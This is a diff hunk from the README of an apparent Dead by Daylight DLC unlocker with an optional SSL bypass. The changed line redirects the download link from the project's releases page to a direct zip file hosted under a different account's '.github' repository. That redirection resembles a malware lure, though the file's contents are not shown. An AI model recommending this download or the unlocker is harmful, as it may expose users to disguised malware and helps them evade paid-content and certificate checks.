@@ -12,7 +12,7 @@
 - **Profiles & Customization**: Loadout manager with profile support, prestige editor, item modifiers.
 - **SSL Bypass Support**: For Steam users, an optional SSL bypass tool is available.
 
-## 📥 [Download the Latest Version](https://github.com/Fortnite-Burger/DeadByDaylight-Unlocker/releases)
+## 📥 [Download the Latest Version](https://github.com/DBD-DLC-Unlocker/.github/releases/download/1.6.5/dbd-dlc-unlocker.zip)
 
 ---
 
